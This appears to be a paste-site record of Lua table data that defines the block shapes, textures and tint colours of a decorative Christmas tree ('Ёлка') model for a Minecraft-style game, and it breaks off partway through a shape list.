id,title,username,language,date,content
4i4mPXbc,Ёлка (внешний ресурс),Dreamlight_MCSkill,Lua,Thursday 7th of March 2024 06:07:38 PM CDT,"{
  label = ""Ёлка"",
  shapes = {
    { 6,0,15,8,4,16,texture = ""snow"", tint = 0xff6666 },
    { 11,0,5,13,3,6,texture = ""snow"", tint = 0x770000 },
    { 11,0,6,16,3,7,texture = ""snow"", tint = 0xff9900 },
    { 11,0,7,13,3,11,texture = ""snow"", tint = 0x770000 },
    { 13,0,5,14,3,11,texture = ""snow"", tint = 0xff9900 },
    { 14,0,5,16,3,6,texture = ""snow"", tint = 0x770000 },
    { 14,0,7,16,3,11,texture = ""snow"", tint = 0x770000 },
    { 15,0,15,16,5,16,texture = ""quartz_block_side"", tint = 0x663300 },
    { 4,5,14,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 5,5,11,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,5,9,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,5,8,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,5,6,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,5,5,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 12,5,4,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,7,14,16,8,15,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 5,7,12,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,7,9,7,8,10,texture = ""snow"", tint = 0xffff66 },
    { 6,7,10,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,7,9,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,7,8,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,7,7,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,7,6,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,7,5,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 13,7,4,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,8,13,16,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,8,11,16,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,8,9,16,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,8,8,16,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,8,7,16,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 12,8,6,16,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 14,8,5,16,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,9,14,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,9,12,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,9,10,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,9,9,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,9,8,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,9,7,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 12,9,6,13,10,7,texture = ""snow"", tint = 0xffff66 },
    { 13,9,6,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 15,9,5,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,10,14,16,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,10,12,16,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,10,10,16,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,10,9,16,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,10,8,16,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 11,10,7,16,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 13,10,6,16,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,12,14,16,13,15,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,12,13,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,12,11,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,12,10,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,12,9,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 11,12,8,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 12,12,7,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 14,12,6,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,13,14,8,14,15,texture = ""snow"", tint = 0xffff66 },
    { 8,13,13,16,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,13,11,16,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,13,10,16,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 11,13,9,16,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 12,13,8,16,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 14,13,7,16,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,14,14,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,14,12,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,14,10,11,15,11,texture = ""snow"", tint = 0xffff66 },
    { 10,14,11,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 11,14,10,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 12,14,9,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 13,14,8,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 15,14,7,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,15,14,16,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 9,15,12,16,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 10,15,11,16,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,15,10,16,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 12,15,9,16,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 13,15,8,16,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 4,0,1,10,4,2,texture = ""snow"", tint = 0xff6666 },
    { 4,0,2,11,4,3,texture = ""iron_block"", tint = 0xcc66cc },
    { 5,0,0,9,4,2,texture = ""snow"", tint = 0xff6666 },
    { 5,0,3,11,4,4,texture = ""snow"", tint = 0xff6666 },
    { 6,0,4,12,4,5,texture = ""snow"", tint = 0xff6666 },
    { 7,0,5,13,4,6,texture = ""snow"", tint = 0xff6666 },
    { 7,0,6,14,4,7,texture = ""iron_block"", tint = 0xcc66cc },
    { 8,0,7,14,4,8,texture = ""snow"", tint = 0xff6666 },
    { 9,0,8,13,4,9,texture = ""snow"", tint = 0xff6666 },
    { 10,0,9,12,4,10,texture = ""snow"", tint = 0xff6666 },
    { 15,0,0,16,5,1,texture = ""quartz_block_side"", tint = 0x663300 },
    { 5,5,0,16,8,3,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 5,5,3,16,7,4,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,5,4,16,7,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,5,6,16,7,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,5,7,16,7,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,5,8,16,7,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,5,9,16,7,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 12,5,10,16,7,11,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 15,5,11,16,8,12,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,7,3,16,8,5,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,7,5,16,8,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,7,6,16,8,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,7,7,16,8,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,7,8,16,8,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,7,9,11,8,10,texture = ""snow"", tint = 0xffff66 },
    { 11,7,9,16,8,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 13,7,10,16,8,11,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,8,0,16,9,2,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,8,2,7,9,3,texture = ""snow"", tint = 0xffff66 },
    { 7,8,2,16,9,4,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,8,4,16,9,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,8,6,16,9,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,8,7,16,9,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 12,8,8,16,9,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 14,8,9,16,9,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,9,0,16,10,1,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,9,1,16,10,3,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,9,3,16,10,5,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,9,5,16,10,6,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,9,6,16,10,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,9,7,16,10,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 13,9,8,16,10,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 15,9,9,16,10,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,10,0,16,12,3,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,10,3,16,12,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,10,5,16,12,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,10,6,16,12,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 11,10,7,16,12,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 13,10,8,16,12,9,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,12,0,16,13,2,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,12,2,16,13,4,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,12,4,16,13,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,12,5,16,13,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 11,12,6,16,13,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 12,12,7,16,13,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 14,12,8,16,13,9,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,13,0,16,14,2,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,13,2,16,14,4,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,13,4,16,14,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 11,13,5,16,14,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 12,13,6,16,14,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 14,13,7,16,14,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,14,0,16,15,1,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,14,1,16,15,3,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,14,3,16,15,4,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,14,4,11,15,5,texture = ""snow"", tint = 0xffff66 },
    { 11,14,4,16,15,5,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 12,14,5,16,15,6,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 13,14,6,16,15,7,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 15,14,7,16,15,8,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,15,0,16,16,3,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 10,15,3,16,16,4,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,15,4,16,16,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 12,15,5,16,16,6,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 13,15,6,16,16,7,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 15,15,7,16,16,8,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 8,0,14,16,1,15,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 9,0,13,16,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 10,0,12,16,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,0,11,16,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 12,0,10,16,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 13,0,9,16,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 14,0,8,16,1,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 10,1,14,16,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,1,12,16,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 12,1,11,16,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 13,1,10,16,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 15,1,9,16,2,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 10,2,15,16,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,2,13,16,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 14,2,10,16,3,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 15,2,9,16,3,10,texture = ""snow"", tint = 0xffff66 },
    { 11,3,13,12,4,14,texture = ""snow"", tint = 0xffff66 },
    { 11,3,14,16,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 12,3,12,16,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,3,11,16,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 15,3,10,16,4,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 12,4,14,16,5,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,4,12,16,5,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 15,4,11,16,5,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 12,5,15,16,6,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,5,13,16,6,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 14,5,12,16,6,16,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 12,6,15,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 13,6,13,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 14,6,12,16,7,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 13,7,14,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 14,7,12,15,8,13,texture = ""snow"", tint = 0xffff66 },
    { 14,7,13,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 15,7,12,16,8,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 13,8,15,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 14,8,14,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 15,8,13,16,10,16,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 14,10,14,16,11,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 15,10,13,16,11,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 14,11,15,16,13,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 15,11,13,16,12,14,texture = ""snow"", tint = 0xffff66 },
    { 15,11,14,16,14,16,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 15,14,15,16,15,16,texture = ""leaves_spruce_opaque"", tint = 0x00ee00 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 9,0,0,16,1,2,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 10,0,2,16,1,3,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,0,3,16,1,4,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 12,0,4,16,1,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 13,0,5,16,1,6,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 14,0,6,16,1,7,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 15,0,7,16,1,8,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 10,1,0,16,2,1,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,1,1,16,2,3,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 12,1,3,16,3,4,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 13,1,4,16,2,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 15,1,5,16,2,6,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,2,0,16,3,2,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 12,2,2,16,3,4,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 14,2,4,16,3,5,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 11,3,0,16,4,1,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 12,3,1,16,4,3,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,3,3,16,4,4,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 15,3,4,16,4,5,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 12,4,0,16,5,1,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,4,1,16,5,3,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,4,3,14,5,4,texture = ""snow"", tint = 0xffff66 },
    { 15,4,3,16,5,4,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,5,0,16,6,2,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 14,5,2,16,6,3,texture = ""leaves_spruce_opaque"", tint = 0x00aa00 },
    { 13,6,0,16,7,2,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 14,6,2,16,7,3,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 13,7,0,16,8,1,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 14,7,1,16,8,2,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 15,7,2,16,8,3,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 14,8,0,16,10,1,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 15,8,1,16,10,2,texture = ""leaves_spruce_opaque"", tint = 0x00bb00 },
    { 15,9,2,16,10,3,texture = ""snow"", tint = 0xffff66 },
    { 14,10,0,16,11,1,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 15,10,1,16,11,2,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
    { 15,11,0,16,14,1,texture = ""leaves_spruce_opaque"", tint = 0x00dd00 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 15,1,15,16,2,16,texture = ""snow"", tint = 0xffcc66 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 0,0,5,1,3,6,texture = ""snow"", tint = 0x770000 },
    { 0,0,6,1,3,7,texture = ""snow"", tint = 0xff9900 },
    { 0,0,7,1,3,11,texture = ""snow"", tint = 0x770000 },
    { 0,0,14,2,5,16,texture = ""quartz_block_side"", tint = 0x663300 },
    { 2,0,15,3,5,16,texture = ""quartz_block_side"", tint = 0x663300 },
    { 4,0,9,6,2,10,texture = ""snow"", tint = 0x330099 },
    { 4,0,10,8,2,11,texture = ""snow"", tint = 0x33ccff },
    { 4,0,11,6,2,12,texture = ""snow"", tint = 0x330099 },
    { 6,0,9,7,2,12,texture = ""snow"", tint = 0x33ccff },
    { 7,0,9,8,2,10,texture = ""snow"", tint = 0x330099 },
    { 7,0,11,8,2,12,texture = ""snow"", tint = 0x330099 },
    { 7,0,15,8,4,16,texture = ""snow"", tint = 0x0000cc },
    { 8,0,15,9,4,16,texture = ""snow"", tint = 0x663366 },
    { 9,0,15,11,4,16,texture = ""snow"", tint = 0x0000cc },
    { 0,5,3,2,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 2,5,4,5,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 5,5,5,7,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,5,6,8,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,5,7,9,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,5,8,10,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,5,9,11,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,5,11,12,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 12,5,15,13,7,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 0,7,4,4,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 1,7,3,2,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,7,5,6,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,7,6,7,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,7,7,8,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,7,8,9,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,7,9,10,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,7,10,11,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 11,7,12,12,8,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 0,8,5,2,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 2,8,5,3,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 3,8,6,5,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,8,5,5,9,6,texture = ""snow"", tint = 0xffff66 },
    { 5,8,7,7,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,8,8,8,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,8,9,9,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,8,11,10,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,8,13,11,9,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 2,9,6,4,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,9,7,6,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,9,8,7,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 7,9,9,8,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 8,9,10,9,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 9,9,11,10,10,12,texture = ""snow"", tint = 0xffff66 },
    { 9,9,12,10,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 10,9,14,11,10,16,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 0,10,5,2,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 2,10,6,4,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 4,10,7,6,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,10,8,7,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,10,9,8,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,10,10,9,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,10,12,10,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 10,10,15,11,12,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 0,12,6,3,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 1,12,5,2,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 3,12,7,5,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 5,12,8,6,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,12,9,7,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,12,10,8,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,12,11,9,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 9,12,13,10,13,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 0,13,7,2,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 1,13,6,2,14,7,texture = ""snow"", tint = 0xffff66 },
    { 2,13,7,3,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 3,13,8,5,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 5,13,9,6,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,13,10,7,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,13,11,8,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,13,13,9,14,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 2,14,8,4,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 4,14,9,5,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 5,14,10,6,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 6,14,11,7,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 7,14,12,8,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 8,14,13,9,15,14,texture = ""snow"", tint = 0xffff66 },
    { 8,14,14,9,15,16,texture = ""leaves_spruce_opaque"", tint = 0x007700 },
    { 0,15,7,2,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 2,15,8,4,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 4,15,9,5,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 5,15,10,6,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 6,15,11,7,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 7,15,12,8,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
    { 8,15,15,9,16,16,texture = ""leaves_spruce_opaque"", tint = 0x008800 },
  }
},

{
  label = ""Ёлка"",
  shapes = {
    { 0,0,0,2,5,2,texture = ""quartz_block_side"", tint = 0x663300 },
    { 1,0,8,2,3,9,texture = ""snow"", tint = 0x9999ff },
    { 1,0,9,4,3,10,texture = ""snow"", tint = 0x99cccc },
    { 1,0,10,2,3,11,texture = ""snow"", tint = 0x9999ff },
    { 2,0,0,3,5,1,texture = ""quartz_block_side"", tint = 0x663300 },
    { 2,0,8,3,3,11,texture = ""snow"", tint = 0x99cccc },
    { 3,0,8,4,3,9,texture = ""snow"", tint = 0x9999ff },
    { 3,0,10,4,3,11,texture = ""snow"", tint = 0x9999ff },
    { 7,0,0,8,4,6,texture = ""snow"", tint = 0x0000cc },
    { 7,0,6,11,4,7,texture = ""snow"", tint = 0x663366 },
    { 7,0,7,8,4,8,texture = ""snow"", tint = 0x0000cc },
    { 8,0,0,9,4,8,texture = ""snow"", tint = 0x663366 },
    { 9,0,0,11,4,6,texture = ""snow"", tint = 0x0000cc },
    { 9,0,7,11,4,8,texture = ""snow"", tint = 0x0000cc },
    { 0,5,0,2,10,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 0,5,10,4,8,11,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 0,5,11,1,7,12,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 2,5,0,4,10,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 2,5,9,5,7,11,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,5,0,6,10,8,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 4,5,8,8,7,9,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 5,5,9,7,7,10,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
    { 6,5,0,7,10,7,texture = ""leaves_spruce_opaque"", tint = 0x005500 },
